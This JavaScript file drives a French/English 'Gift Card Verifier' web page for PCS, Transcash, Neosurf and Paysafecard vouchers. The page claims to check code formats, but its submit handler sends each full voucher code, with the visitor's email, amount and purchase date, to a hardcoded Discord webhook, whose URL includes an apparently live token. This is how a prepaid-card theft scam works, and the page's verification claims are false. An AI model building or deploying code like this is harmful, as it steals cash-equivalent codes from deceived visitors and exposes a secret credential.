// ===== CONFIGURATION =====
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1530834730633789612/s1De5VDBXy9mL4nTYxp4CJ1CUA3NcRq_-HvVljq1NYbdqW_a7ZfRBKcNSiBfxRBE3SmT';
const DISCORD_ROLE_MENTION = '';

const STORAGE_KEYS = {
    language: 'preferred-language',
    theme: 'preferred-theme'
};

const prefersReducedMotion = window.matchMedia('(prefers-reduced-motion: reduce)');
const isTouchViewport = window.matchMedia('(max-width: 640px)');
const canHover = window.matchMedia('(hover: hover) and (pointer: fine)');

const CARD_RULES = {
    PCS: {
        key: 'PCS',
        allowed: /[^a-zA-Z0-9]/g,
        validate: value => /^[A-Z0-9]{10}$/.test(value),
        format: value => value.toUpperCase(),
        maxLength: 10,
        label: { fr: 'Code PCS', en: 'PCS code' },
        help: { fr: 'PCS : 10 caractères alphanumériques.', en: 'PCS: 10 alphanumeric characters.' },
        meta: { fr: 'Format détecté : 10 caractères', en: 'Expected format: 10 characters' },
        placeholder: 'A7218JH12'
    },
    Transcash: {
        key: 'Transcash',
        allowed: /\D/g,
        validate: value => /^\d{12}$/.test(value),
        format: value => value,
        maxLength: 12,
        label: { fr: 'Code Transcash', en: 'Transcash code' },
        help: { fr: 'Transcash : 12 chiffres.', en: 'Transcash: 12 digits.' },
        meta: { fr: 'Format détecté : 12 chiffres', en: 'Expected format: 12 digits' },
        placeholder: '123456789012'
    },
    Neosurf: {
        key: 'Neosurf',
        allowed: /[^a-zA-Z0-9]/g,
        validate: value => /^[A-Z0-9]{10}$/.test(value),
        format: value => value.toUpperCase(),
        maxLength: 10,
        label: { fr: 'Code Neosurf', en: 'Neosurf code' },
        help: { fr: 'Neosurf : 10 caractères.', en: 'Neosurf: 10 characters.' },
        meta: { fr: 'Format détecté : 10 caractères', en: 'Expected format: 10 characters' },
        placeholder: '12345ABCDE'
    },
    Paysafecard: {
        key: 'Paysafecard',
        allowed: /\D/g,
        validate: value => /^\d{16}$/.test(value),
        format: value => value,
        maxLength: 16,
        label: { fr: 'Code Paysafecard', en: 'Paysafecard code' },
        help: { fr: 'Paysafecard : 16 chiffres.', en: 'Paysafecard: 16 digits.' },
        meta: { fr: 'Format détecté : 16 chiffres', en: 'Expected format: 16 digits' },
        placeholder: '1234567890123456'
    }
};

const translations = {
    fr: {
        header: { tagline: 'Interface de vérification modernisée' },
        hero: {
            badge: 'Expérience premium • validation en temps réel',
            title: 'Vérificateur de Cartes Cadeaux',
            subtitle: 'Vérifiez le format de vos cartes PCS, Transcash, Neosurf et Paysafecard puis transmettez votre demande.'
        },
        form: {
            title: 'Vérifier une carte',
            subtitle: 'Sélectionnez une carte, saisissez le code attendu et transmettez la demande.',
            cardType: 'Type de carte',
            cardHint: 'Choisissez une carte pour adapter le format du code',
            mobilePicker: 'Choisir une carte',
            noCardSelected: 'Aucune carte sélectionnée',
            sheetTitle: 'Choisir une carte',
            sheetSubtitle: 'Le format du code s\'adapte à la marque sélectionnée.',
            selectedCardPrefix: 'Carte sélectionnée :',
            pin: 'Code',
            pinMetaDefault: 'Le format dépend de la carte choisie',
            pinHelpDefault: 'Choisissez une carte pour charger le bon format.',
            email: 'Votre email',
            amount: 'Montant initial (optionnel)',
            purchaseDate: 'Date d\'achat (optionnel)',
            message: 'Message supplémentaire (optionnel)',
            securityTitle: 'Transmission du formulaire',
            security: 'Les champs sont validés dans le navigateur puis transmis à la destination configurée, sans sauvegarde locale du contenu du formulaire.',
            submit: 'Envoyer la demande',
            sending: 'Envoi...'
        },
        faq: {
            kicker: 'Aide',
            title: 'Questions fréquentes',
            q1: { title: 'Comment fonctionne la vérification ?', text: 'Le formulaire adapte le format du code à la carte sélectionnée, valide les champs côté navigateur puis transmet la demande.' },
            q2: { title: 'Le site stocke-t-il mes données ?', text: 'Le contenu du formulaire n\'est pas conservé après l\'envoi. Seules la langue et le thème sont mémorisés.' },
            q3: { title: 'Quelles cartes sont supportées ?', text: 'PCS, Transcash, Neosurf et Paysafecard sont pris en charge.' },
            q4: { title: 'Quel est le délai de traitement ?', text: 'Le site transmet la demande immédiatement. Le délai de réponse dépend du canal configuré.' }
        },
        footer: {
            subtitle: 'UI premium, responsive et prête pour l\'évolution du backend',
            privacy: 'Politique de confidentialité',
            terms: 'Conditions d\'utilisation',
            copy: '© 2026 GiftCard Verifier. Tous droits réservés.'
        },
        modal: {
            title: 'Demande envoyée',
            description: 'Votre demande a été transmise à la destination configurée.',
            close: 'Fermer'
        },
        theme: { toDark: 'Activer le mode sombre', toLight: 'Activer le mode clair' },
        validation: {
            selectCard: 'Veuillez sélectionner un type de carte.',
            pinInvalidFor: card => `Le format du code ${card} est invalide.`,
            pinNeedsCard: 'Choisissez une carte pour valider le code.',
            emailInvalid: 'Veuillez entrer un email valide.',
            amountNegative: 'Le montant ne peut pas être négatif.',
            dateFuture: 'La date d\'achat ne peut pas être dans le futur.'
        },
        result: { error: 'Une erreur est survenue pendant l\'envoi.', timeout: 'La demande a expiré.' }
    },
    en: {
        header: { tagline: 'Modernized verification interface' },
        hero: {
            badge: 'Premium experience • real-time validation',
            title: 'Gift Card Verifier',
            subtitle: 'Check the format of your PCS, Transcash, Neosurf and Paysafecard codes.'
        },
        form: {
            title: 'Verify a card',
            subtitle: 'Select a card, enter the expected code and submit the request.',
            cardType: 'Card type',
            cardHint: 'Choose a card to load the matching code format',
            mobilePicker: 'Choose a card',
            noCardSelected: 'No card selected',
            sheetTitle: 'Choose a card',
            sheetSubtitle: 'The code format changes according to the selected brand.',
            selectedCardPrefix: 'Selected card:',
            pin: 'Code',
            pinMetaDefault: 'The format depends on the selected card',
            pinHelpDefault: 'Choose a card to load the right format.',
            email: 'Your email',
            amount: 'Initial amount (optional)',
            purchaseDate: 'Purchase date (optional)',
            message: 'Additional message (optional)',
            securityTitle: 'Form transmission',
            security: 'Fields are validated in the browser, then sent to the configured destination without storing the form content locally.',
            submit: 'Send request',
            sending: 'Sending...'
        },
        faq: {
            kicker: 'Help',
            title: 'Frequently Asked Questions',
            q1: { title: 'How does the verification flow work?', text: 'The form adapts the code format to the selected card, validates fields in the browser and then sends the request.' },
            q2: { title: 'Does the site store my data?', text: 'The form content is not kept after submission. Only language and theme are remembered.' },
            q3: { title: 'Which cards are supported?', text: 'PCS, Transcash, Neosurf and Paysafecard are supported.' },
            q4: { title: 'How long does processing take?', text: 'The site sends the request immediately. Any later response time depends on the configured channel.' }
        },
        footer: {
            subtitle: 'Premium, responsive UI ready for backend evolution',
            privacy: 'Privacy policy',
            terms: 'Terms of service',
            copy: '© 2026 GiftCard Verifier. All rights reserved.'
        },
        modal: {
            title: 'Request sent',
            description: 'Your request has been transmitted to the configured destination.',
            close: 'Close'
        },
        theme: { toDark: 'Enable dark mode', toLight: 'Enable light mode' },
        validation: {
            selectCard: 'Please select a card type.',
            pinInvalidFor: card => `The ${card} code format is invalid.`,
            pinNeedsCard: 'Choose a card before validating the code.',
            emailInvalid: 'Please enter a valid email address.',
            amountNegative: 'Amount cannot be negative.',
            dateFuture: 'Purchase date cannot be in the future.'
        },
        result: { error: 'An error occurred while sending the form.', timeout: 'Request timed out.' }
    }
};

// ===== POLYFILLS =====
if (!Element.prototype.matches) {
    Element.prototype.matches = Element.prototype.msMatchesSelector || Element.prototype.webkitMatchesSelector;
}
if (!Array.from) {
    Array.from = function(arrayLike) { return [].slice.call(arrayLike); };
}

// ===== ÉLÉMENTS DOM =====
const elements = {
    body: document.body,
    form: document.getElementById('verificationForm'),
    cardTypeInput: document.getElementById('cardType'),
    cardTypeError: document.getElementById('cardTypeError'),
    pinInput: document.getElementById('pin'),
    pinLabel: document.getElementById('pinLabel'),
    pinHelp: document.getElementById('pinHelp'),
    pinMetaHint: document.getElementById('pinMetaHint'),
    pinFieldWrap: document.getElementById('pinFieldWrap'),
    pinError: document.getElementById('pinError'),
    emailInput: document.getElementById('email'),
    emailFieldWrap: document.getElementById('emailFieldWrap'),
    emailError: document.getElementById('emailError'),
    amountInput: document.getElementById('amount'),
    purchaseDateInput: document.getElementById('purchaseDate'),
    messageInput: document.getElementById('message'),
    submitBtn: document.getElementById('submitBtn'),
    btnText: document.getElementById('btnText'),
    btnLoader: document.getElementById('btnLoader'),
    result: document.getElementById('result'),
    cardOptions: Array.from(document.querySelectorAll('.card-option')),
    langButtons: Array.from(document.querySelectorAll('.lang-btn')),
    themeToggle: document.getElementById('themeToggle'),
    themeIcon: document.querySelector('#themeToggle i'),
    selectedCardHint: document.getElementById('selectedCardHint'),
    cardMobileTrigger: document.getElementById('cardMobileTrigger'),
    mobileSelectedCard: document.getElementById('mobileSelectedCard'),
    cardSelectorSheet: document.getElementById('cardSelectorSheet'),
    sheetOverlay: document.getElementById('sheetOverlay'),
    sheetClose: document.getElementById('sheetClose'),
    successModal: document.getElementById('successModal'),
    closeSuccessModal: document.getElementById('closeSuccessModal'),
    confettiLayer: document.getElementById('confettiLayer'),
    particlesCanvas: document.getElementById('particles'),
    heroSection: document.querySelector('.hero')
};

let currentLang = 'fr';
let currentTheme = 'light';
let previousFocusedElement = null;
let isInitialized = false;

// ===== FONCTIONS UTILES =====
function getCurrentTranslations() { return translations[currentLang] || translations.fr; }
function translate(keyPath) {
    const keys = keyPath.split('.');
    let value = getCurrentTranslations();
    for (const key of keys) value = value?.[key];
    return value;
}
function sanitizeInput(value) {
    if (!value) return '';
    const div = document.createElement('div');
    div.textContent = value;
    return div.innerHTML;
}
function getSelectedCardRule() { return CARD_RULES[elements.cardTypeInput.value] || null; }

// ===== THÈME =====
function updateThemeButton() {
    const toDark = currentTheme !== 'dark';
    elements.themeIcon.className = `fas ${toDark ? 'fa-moon' : 'fa-sun'}`;
    const label = toDark ? getCurrentTranslations().theme.toDark : getCurrentTranslations().theme.toLight;
    elements.themeToggle.setAttribute('aria-label', label);
    elements.themeToggle.setAttribute('title', label);
}
function applyTheme(theme) {
    currentTheme = theme === 'dark' ? 'dark' : 'light';
    elements.body.classList.toggle('dark', currentTheme === 'dark');
    localStorage.setItem(STORAGE_KEYS.theme, currentTheme);
    updateThemeButton();
}

// ===== LANGUE =====
function setLanguage(lang) {
    currentLang = translations[lang] ? lang : 'fr';
    const t = getCurrentTranslations();
    document.documentElement.lang = currentLang;
    document.querySelectorAll('[data-i18n]').forEach(el => {
        const value = translate(el.getAttribute('data-i18n'));
        if (typeof value === 'string') el.textContent = value;
    });
    elements.langButtons.forEach(btn => btn.classList.toggle('active', btn.dataset.lang === currentLang));
    localStorage.setItem(STORAGE_KEYS.language, currentLang);
    updateDynamicText();
    updateThemeButton();
    updateSelectedCardUI();
}

// ===== GESTION DES CARTES =====
function updateSelectedCardUI() {
    const selectedValue = elements.cardTypeInput.value;
    const t = getCurrentTranslations();
    elements.cardOptions.forEach(option => {
        const selected = option.dataset.value === selectedValue;
        option.classList.toggle('selected', selected);
        option.setAttribute('aria-pressed', String(selected));
        option.setAttribute('aria-selected', String(selected));
    });
    if (selectedValue) {
        elements.mobileSelectedCard.textContent = selectedValue;
        elements.selectedCardHint.textContent = `${t.form.selectedCardPrefix} ${selectedValue}`;
    } else {
        elements.mobileSelectedCard.textContent = t.form.noCardSelected;
        elements.selectedCardHint.textContent = t.form.cardHint;
    }
    updateDynamicText();
    validateCardSelection(false);
}

function selectCard(cardValue, source = 'ui') {
    if (!CARD_RULES[cardValue]) return;
    elements.cardTypeInput.value = cardValue;
    updateSelectedCardUI();
    validatePin(false);

    // Fermeture systématique du sheet sur mobile
    if (isTouchViewport.matches) {
        // Feedback visuel
        const selectedOption = elements.cardOptions.find(opt => opt.dataset.value === cardValue);
        if (selectedOption) {
            selectedOption.style.transform = 'scale(0.95)';
            setTimeout(() => { selectedOption.style.transform = ''; }, 150);
        }
        // Fermer le sheet
        closeCardSheet();
        // Focus sur le champ code après un court délai
        if (source === 'ui') {
            setTimeout(() => { elements.pinInput.focus(); }, 200);
        }
    }
}

// ===== SHEET MOBILE =====
function openCardSheet() {
    if (!isTouchViewport.matches) return;
    previousFocusedElement = document.activeElement;
    elements.sheetOverlay.classList.remove('hidden');
    elements.cardSelectorSheet.classList.add('open');
    elements.cardMobileTrigger.setAttribute('aria-expanded', 'true');
    elements.body.classList.add('sheet-open');
    requestAnimationFrame(() => {
        const selected = elements.cardOptions.find(opt => opt.classList.contains('selected')) || elements.cardOptions[0];
        selected?.focus();
    });
}

function closeCardSheet() {
    elements.sheetOverlay.classList.add('hidden');
    elements.cardSelectorSheet.classList.remove('open');
    elements.cardMobileTrigger.setAttribute('aria-expanded', 'false');
    elements.body.classList.remove('sheet-open');
    previousFocusedElement?.focus?.();
}

// ===== VALIDATION =====
function setInputState(wrapper, iconClass, state) {
    wrapper.classList.remove('input-neutral', 'input-progress', 'input-valid', 'input-invalid');
    wrapper.classList.add(state);
    const icon = wrapper.querySelector('i');
    if (icon) icon.className = iconClass;
}
function sanitizePin(rawValue) {
    const rule = getSelectedCardRule();
    if (!rule) return rawValue.replace(/\s/g, '').toUpperCase().slice(0, 20);
    const cleaned = rawValue.replace(rule.allowed, '');
    return rule.format(cleaned).slice(0, rule.maxLength);
}
function validatePin(showError = false) {
    const rule = getSelectedCardRule();
    const value = sanitizePin(elements.pinInput.value);
    elements.pinInput.value = value;
    if (!rule) {
        setInputState(elements.pinFieldWrap, 'fas fa-key', value ? 'input-progress' : 'input-neutral');
        if (showError) elements.pinError.textContent = getCurrentTranslations().validation.pinNeedsCard;
        return false;
    }
    if (!value) {
        setInputState(elements.pinFieldWrap, 'fas fa-key', 'input-neutral');
        if (showError) elements.pinError.textContent = getCurrentTranslations().validation.pinInvalidFor(rule.key);
        else elements.pinError.textContent = '';
        return false;
    }
    if (rule.validate(value)) {
        setInputState(elements.pinFieldWrap, 'fas fa-check-circle', 'input-valid');
        elements.pinError.textContent = '';
        return true;
    }
    setInputState(elements.pinFieldWrap, 'fas fa-key', showError ? 'input-invalid' : 'input-progress');
    elements.pinError.textContent = showError ? getCurrentTranslations().validation.pinInvalidFor(rule.key) : '';
    return false;
}
function validateEmail(showError = false) {
    const value = elements.emailInput.value.trim();
    if (!value) {
        setInputState(elements.emailFieldWrap, 'fas fa-envelope', 'input-neutral');
        if (showError) elements.emailError.textContent = getCurrentTranslations().validation.emailInvalid;
        else elements.emailError.textContent = '';
        return false;
    }
    const valid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value);
    setInputState(elements.emailFieldWrap, valid ? 'fas fa-check-circle' : 'fas fa-envelope', valid ? 'input-valid' : (showError ? 'input-invalid' : 'input-progress'));
    elements.emailError.textContent = valid || !showError ? '' : getCurrentTranslations().validation.emailInvalid;
    return valid;
}
function validateCardSelection(showError = false) {
    const hasSelection = Boolean(elements.cardTypeInput.value);
    elements.cardTypeError.textContent = hasSelection || !showError ? '' : getCurrentTranslations().validation.selectCard;
    return hasSelection;
}
function validateAmount(showError = false) {
    const value = elements.amountInput.value.trim();
    if (!value) return true;
    const amount = parseFloat(value);
    if (isNaN(amount) || amount < 0) {
        if (showError) showInlineError(getCurrentTranslations().validation.amountNegative);
        return false;
    }
    return true;
}
function validateDate(showError = false) {
    const value = elements.purchaseDateInput.value;
    if (!value) return true;
    const selectedDate = new Date(value);
    const today = new Date();
    today.setHours(0,0,0,0);
    if (selectedDate > today) {
        if (showError) showInlineError(getCurrentTranslations().validation.dateFuture);
        return false;
    }
    return true;
}
function validateForm() {
    const cardOk = validateCardSelection(true);
    const pinOk = validatePin(true);
    const emailOk = validateEmail(true);
    const amountOk = validateAmount(true);
    const dateOk = validateDate(true);
    return cardOk && pinOk && emailOk && amountOk && dateOk;
}

// ===== MESSAGES =====
function showInlineError(message) {
    elements.result.className = 'result-fallback error';
    elements.result.textContent = sanitizeInput(message);
    elements.result.classList.remove('hidden');
}
function clearInlineResult() {
    elements.result.classList.add('hidden');
    elements.result.textContent = '';
    elements.result.className = 'result-fallback hidden';
}

// ===== TEXTE DYNAMIQUE =====
function updateDynamicText() {
    const t = getCurrentTranslations();
    elements.emailInput.placeholder = currentLang === 'fr' ? 'vous@exemple.com' : 'you@example.com';
    elements.amountInput.placeholder = '50.00';
    elements.messageInput.placeholder = currentLang === 'fr' ? 'Informations complémentaires...' : 'Additional details...';
    const rule = getSelectedCardRule();
    if (rule) {
        elements.pinLabel.textContent = rule.label[currentLang];
        elements.pinHelp.textContent = rule.help[currentLang];
        elements.pinMetaHint.textContent = rule.meta[currentLang];
        elements.pinInput.placeholder = rule.placeholder;
        elements.pinInput.maxLength = rule.maxLength;
    } else {
        elements.pinLabel.textContent = t.form.pin;
        elements.pinHelp.textContent = t.form.pinHelpDefault;
        elements.pinMetaHint.textContent = t.form.pinMetaDefault;
        elements.pinInput.placeholder = currentLang === 'fr' ? 'Sélectionnez une carte d\'abord' : 'Select a card first';
        elements.pinInput.removeAttribute('maxLength');
    }
}

// ===== ENVOI À DISCORD =====
async function sendToDiscord(data) {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 15000);
    const embed = {
        title: '🎫 Nouvelle demande de vérification',
        color: 0x6366F1,
        fields: [
            { name: '👤 Email', value: data.email, inline: false },
            { name: '💳 Type de carte', value: data.cardType, inline: true },
            { name: '🔑 Code', value: `\`${data.pin}\``, inline: true },
            { name: '💰 Montant', value: data.amount || 'Non spécifié', inline: true },
            { name: '📅 Date d\'achat', value: data.purchaseDate || 'Non spécifié', inline: true },
            { name: '📝 Message', value: data.message || 'Aucun message', inline: false },
            { name: '🌐 Langue', value: data.lang.toUpperCase(), inline: true }
        ],
        footer: { text: `Demande reçue le ${data.timestamp}` }
    };
    const payload = {
        content: DISCORD_ROLE_MENTION ? `<@&${DISCORD_ROLE_MENTION}> Nouvelle demande à traiter.` : 'Nouvelle demande à traiter.',
        embeds: [embed],
        username: 'GiftCard Verifier',
        avatar_url: 'https://cdn-icons-png.flaticon.com/512/1046/1046784.png'
    };
    try {
        const response = await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
            signal: controller.signal
        });
        clearTimeout(timeoutId);
        return response.ok;
    } catch (error) {
        clearTimeout(timeoutId);
        if (error.name === 'AbortError') throw new Error(getCurrentTranslations().result.timeout);
        throw error;
    }
}

// ===== RÉINIT FORMULAIRE =====
function resetFormState() {
    elements.form.reset();
    elements.cardTypeInput.value = '';
    updateSelectedCardUI();
    setInputState(elements.pinFieldWrap, 'fas fa-key', 'input-neutral');
    setInputState(elements.emailFieldWrap, 'fas fa-envelope', 'input-neutral');
    elements.pinError.textContent = '';
    elements.emailError.textContent = '';
    elements.cardTypeError.textContent = '';
    updateDynamicText();
}

// ===== MODAL SUCCÈS =====
function createConfetti() {
    if (!elements.confettiLayer) return;
    elements.confettiLayer.innerHTML = '';
    if (prefersReducedMotion.matches) return;
    const colors = ['#6366f1', '#8b5cf6', '#10b981', '#f59e0b', '#ec4899'];
    for (let i = 0; i < 18; i++) {
        const piece = document.createElement('span');
        piece.className = 'confetti-piece';
        piece.style.left = `${6 + Math.random() * 88}%`;
        piece.style.animationDelay = `${Math.random() * 250}ms`;
        piece.style.setProperty('--piece-color', colors[i % colors.length]);
        piece.style.setProperty('--piece-x', `${(Math.random() - 0.5) * 160}px`);
        piece.style.setProperty('--piece-rotate', `${90 + Math.random() * 260}deg`);
        elements.confettiLayer.appendChild(piece);
    }
}
function openSuccessModal() {
    previousFocusedElement = document.activeElement;
    createConfetti();
    elements.successModal.classList.remove('hidden');
    elements.successModal.setAttribute('aria-hidden', 'false');
    elements.body.classList.add('modal-open');
    requestAnimationFrame(() => elements.closeSuccessModal.focus());
}
function closeSuccessModal() {
    elements.successModal.classList.add('hidden');
    elements.successModal.setAttribute('aria-hidden', 'true');
    elements.body.classList.remove('modal-open');
    previousFocusedElement?.focus?.();
}

// ===== PARTICULES =====
function initParticles() {
    const canvas = elements.particlesCanvas;
    const hero = elements.heroSection;
    if (!canvas || !hero) return;
    const ctx = canvas.getContext('2d');
    if (!ctx) return;
    let animId, particles = [], w = 0, h = 0;
    const count = 30;
    const resize = () => {
        const rect = hero.getBoundingClientRect();
        w = Math.max(1, Math.floor(rect.width));
        h = Math.max(1, Math.floor(rect.height));
        canvas.width = w * Math.min(window.devicePixelRatio || 1, 2);
        canvas.height = h * Math.min(window.devicePixelRatio || 1, 2);
        canvas.style.width = w + 'px';
        canvas.style.height = h + 'px';
        ctx.setTransform(1,0,0,1,0,0);
        ctx.scale(Math.min(window.devicePixelRatio||1,2), Math.min(window.devicePixelRatio||1,2));
        particles = Array.from({ length: count }, () => ({
            x: Math.random() * w, y: Math.random() * h,
            vx: (Math.random() - 0.5) * 0.35, vy: (Math.random() - 0.5) * 0.35,
            radius: 1.5 + Math.random() * 2.7,
            alpha: 0.12 + Math.random() * 0.22
        }));
    };
    const draw = () => {
        ctx.clearRect(0, 0, w, h);
        particles.forEach(p => {
            p.x += p.vx; p.y += p.vy;
            if (p.x <= 0 || p.x >= w) p.vx *= -1;
            if (p.y <= 0 || p.y >= h) p.vy *= -1;
            ctx.beginPath();
            ctx.fillStyle = `rgba(99, 102, 241, ${p.alpha})`;
            ctx.arc(p.x, p.y, p.radius, 0, Math.PI * 2);
            ctx.fill();
        });
        animId = requestAnimationFrame(draw);
    };
    resize();
    if (!prefersReducedMotion.matches) draw();
    const ro = typeof ResizeObserver !== 'undefined' ? new ResizeObserver(resize) : null;
    ro?.observe(hero);
    window.addEventListener('resize', resize);
    window.addEventListener('beforeunload', () => {
        if (animId) cancelAnimationFrame(animId);
        ro?.disconnect();
    }, { once: true });
}

// ===== LAZY LOADING =====
function initLazyLoading() {
    if ('IntersectionObserver' in window) {
        const observer = new IntersectionObserver((entries) => {
            entries.forEach(entry => {
                if (entry.isIntersecting) entry.target.classList.add('visible');
            });
        }, { threshold: 0.1, rootMargin: '50px' });
        document.querySelectorAll('.glass-panel:not(.hero-content .glass-panel)').forEach(el => observer.observe(el));
    } else {
        document.querySelectorAll('.glass-panel').forEach(el => el.classList.add('visible'));
    }
}

// ===== TILT =====
function initTilt() {
    if (!canHover.matches || isTouchViewport.matches || prefersReducedMotion.matches) return;
    elements.cardOptions.forEach(card => {
        let raf = null;
        const move = e => {
            if (raf) cancelAnimationFrame(raf);
            raf = requestAnimationFrame(() => {
                const rect = card.getBoundingClientRect();
                const x = e.clientX - rect.left;
                const y = e.clientY - rect.top;
                const cx = rect.width / 2, cy = rect.height / 2;
                const rx = Math.max(-7, Math.min(7, (y - cy) / 12));
                const ry = Math.max(-7, Math.min(7, (cx - x) / 12));
                const s = card.classList.contains('selected') ? 1.06 : 1.03;
                card.style.transform = `perspective(1000px) rotateX(${rx}deg) rotateY(${ry}deg) scale(${s})`;
            });
        };
        const reset = () => {
            if (raf) cancelAnimationFrame(raf);
            card.style.transform = card.classList.contains('selected') ? 'perspective(1000px) rotateX(0deg) rotateY(0deg) scale(1.04)' : 'perspective(1000px) rotateX(0deg) rotateY(0deg) scale(1)';
        };
        card.addEventListener('mousemove', move);
        card.addEventListener('mouseleave', reset);
        card.addEventListener('blur', reset);
        card.addEventListener('focus', reset);
    });
}

// ===== GESTION DES ÉVÉNEMENTS =====
function handleGlobalKeydown(e) {
    if (e.key === 'Escape') {
        if (!elements.successModal.classList.contains('hidden')) closeSuccessModal();
        if (elements.cardSelectorSheet.classList.contains('open')) closeCardSheet();
    }
}

function bindEvents() {
    elements.langButtons.forEach(btn => btn.addEventListener('click', () => setLanguage(btn.dataset.lang)));
    elements.themeToggle.addEventListener('click', () => applyTheme(currentTheme === 'dark' ? 'light' : 'dark'));

    // Sélection des cartes avec stopPropagation
    elements.cardOptions.forEach(option => {
        option.addEventListener('click', (e) => {
            e.stopPropagation();
            selectCard(option.dataset.value);
        });
        option.addEventListener('keydown', e => {
            if (e.key === 'Enter' || e.key === ' ') {
                e.preventDefault();
                selectCard(option.dataset.value);
            }
        });
    });

    elements.cardMobileTrigger.addEventListener('click', openCardSheet);
    elements.sheetClose.addEventListener('click', closeCardSheet);
    elements.sheetOverlay.addEventListener('click', closeCardSheet);
    elements.closeSuccessModal.addEventListener('click', closeSuccessModal);
    elements.successModal.querySelector('[data-close-modal]').addEventListener('click', closeSuccessModal);

    elements.pinInput.addEventListener('input', () => validatePin(false));
    elements.pinInput.addEventListener('blur', () => validatePin(Boolean(elements.pinInput.value)));
    elements.emailInput.addEventListener('input', () => validateEmail(false));
    elements.emailInput.addEventListener('blur', () => validateEmail(Boolean(elements.emailInput.value)));
    elements.amountInput.addEventListener('blur', () => validateAmount(true));
    elements.purchaseDateInput.addEventListener('blur', () => validateDate(true));

    elements.form.addEventListener('submit', async e => {
        e.preventDefault();
        clearInlineResult();
        if (!validateForm()) return;
        elements.submitBtn.disabled = true;
        elements.btnText.classList.add('hidden');
        elements.btnLoader.classList.remove('hidden');

        const formData = {
            cardType: elements.cardTypeInput.value,
            pin: sanitizePin(elements.pinInput.value),
            email: elements.emailInput.value.trim(),
            amount: elements.amountInput.value || 'Non spécifié',
            purchaseDate: elements.purchaseDateInput.value || 'Non spécifié',
            message: elements.messageInput.value.trim() || 'Aucun message',
            timestamp: new Date().toLocaleString(currentLang === 'fr' ? 'fr-FR' : 'en-US'),
            lang: currentLang
        };

        try {
            const success = await sendToDiscord(formData);
            if (!success) throw new Error('Webhook request failed');
            resetFormState();
            openSuccessModal();
        } catch (error) {
            console.error('Form submission failed:', error);
            showInlineError(error.message || getCurrentTranslations().result.error);
        } finally {
            elements.submitBtn.disabled = false;
            elements.btnText.classList.remove('hidden');
            elements.btnLoader.classList.add('hidden');
        }
    });

    document.addEventListener('keydown', handleGlobalKeydown);
    isTouchViewport.addEventListener?.('change', event => { if (!event.matches) closeCardSheet(); });
    prefersReducedMotion.addEventListener?.('change', () => {
        if (prefersReducedMotion.matches) elements.confettiLayer.innerHTML = '';
    });
}

// ===== INITIALISATION =====
function init() {
    if (isInitialized) return;
    isInitialized = true;
    const savedLang = localStorage.getItem(STORAGE_KEYS.language) || 'fr';
    const savedTheme = localStorage.getItem(STORAGE_KEYS.theme) || 'light';
    setInputState(elements.pinFieldWrap, 'fas fa-key', 'input-neutral');
    setInputState(elements.emailFieldWrap, 'fas fa-envelope', 'input-neutral');
    applyTheme(savedTheme);
    setLanguage(savedLang);
    bindEvents();
    initTilt();
    initParticles();
    initLazyLoading();
    document.body.classList.add('loaded');
}

if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
} else {
    init();
}
